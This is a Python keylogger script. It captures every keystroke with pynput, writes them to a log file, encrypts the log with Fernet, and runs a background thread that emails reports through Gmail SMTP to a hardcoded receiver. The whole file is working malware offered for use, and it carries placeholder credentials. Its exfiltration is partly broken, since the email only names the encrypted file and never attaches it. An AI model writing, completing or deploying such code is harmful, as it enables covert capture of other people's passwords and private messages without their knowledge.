import os
import smtplib
import time
import threading
from pynput import keyboard
from cryptography.fernet import Fernet

# CONF
EMAIL_SENDER = "mail@mail.com"
EMAIL_PASSWORD = "password"
EMAIL_RECEIVER = "target@mail.com"
LOG_FILE = "keylogs.txt"
ENCRYPTED_FILE = "keylogs.enc"
KEY_FILE = "key.key"
SEND_INTERVAL = 60  # time between each log update

# AES KEYGEN
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()

cipher = Fernet(key)

# LOG ENCRYPTION
def encrypt_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(ENCRYPTED_FILE, "wb") as enc_file:
            enc_file.write(encrypted_data)
        os.remove(LOG_FILE)  # deletes og unencrypted file

# FUNCTION TO SEND VIA EMAIL
def send_email():
    while True:
        time.sleep(SEND_INTERVAL)
        if os.path.exists(ENCRYPTED_FILE):
            try:
                with open(ENCRYPTED_FILE, "rb") as file:
                    encrypted_data = file.read()
                message = f"Subject: Keylogger Report ^_^\n\nAttached file : {ENCRYPTED_FILE}"

                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)

                os.remove(ENCRYPTED_FILE)  # Supprime après envoi
            except Exception as e:
                print(f"Failed to send : {e}")

# KEY RECORDING
def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            file.write(f" {key} ")

# KEYLOGGER LAUNCH
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Send logs via mail
threading.Thread(target=send_email, daemon=True).start()

print("Keylogging... (Stop : CTRL + C)")

try:
    listener.join()
except KeyboardInterrupt:
    encrypt_logs()
    print("\nKeylogger stopped, logs have been encrypted successfully.")
